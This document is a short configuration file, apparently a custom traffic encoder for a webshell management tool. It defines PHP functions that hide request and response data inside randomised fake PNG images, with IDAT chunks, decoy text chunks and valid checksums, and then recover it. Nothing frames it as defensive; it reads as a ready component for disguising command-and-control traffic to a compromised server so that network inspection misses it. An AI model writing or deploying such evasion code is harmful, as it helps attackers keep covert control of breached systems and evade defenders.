encryptionMethod=function pngIdatChunk($data){$z=gzcompress($data,1+mt_rand(0,8));$pixels=max(1,intval(strlen($data)/4));$w=max(1,intval(sqrt($pixels))+mt_rand(0,2));$h=max(1,intval(ceil($pixels/$w)));$out="\\x89PNG\\r\\n\\x1a\\n";$ihdr=pack("NNCCCCC",$w,$h,8,6,0,0,0);$out.=pack("N",13)."IHDR".$ihdr.pack("N",crc32("IHDR".$ihdr));if(mt_rand(0,1)){$g="\\x00\\x00\\xb1\\x8f";$out.=pack("N",4)."gAMA".$g.pack("N",crc32("gAMA".$g));}$parts=1;if(strlen($z)>0){$parts=1+mt_rand(0,min(3,strlen($z))-1);}$start=0;for($i=0;$i<$parts;$i++){if($i==$parts-1){$end=strlen($z);}else{$remain=strlen($z)-$start-($parts-$i-1);$end=$start+1+mt_rand(0,max(0,$remain-1));}$part=substr($z,$start,$end-$start);$out.=pack("N",strlen($part))."IDAT".$part.pack("N",crc32("IDAT".$part));$start=$end;}$ks=array("Comment","Software","Source","Author");$tn=mt_rand(0,2);for($i=0;$i<$tn;$i++){$t=$ks[mt_rand(0,3)]."\\x00".dechex(mt_rand()).dechex(mt_rand());$out.=pack("N",strlen($t))."tEXt".$t.pack("N",crc32("tEXt".$t));}$out.=pack("N",0)."IEND".pack("N",crc32("IEND"));return $out;}
decryptionMethod=function pngIdatUnwrap($png){$z="";$off=8;$n=strlen($png);while($off+8<=$n){$a=unpack("N",substr($png,$off,4));$len=$a[1];$type=substr($png,$off+4,4);if($type=="IDAT"){$z.=substr($png,$off+8,$len);}$off+=12+$len;}return gzuncompress($z);}
variable=
encryptionCallMethod=$responseData=pngIdatChunk($responseData);
decryptionCallMethod=$requestData=pngIdatUnwrap($requestData);
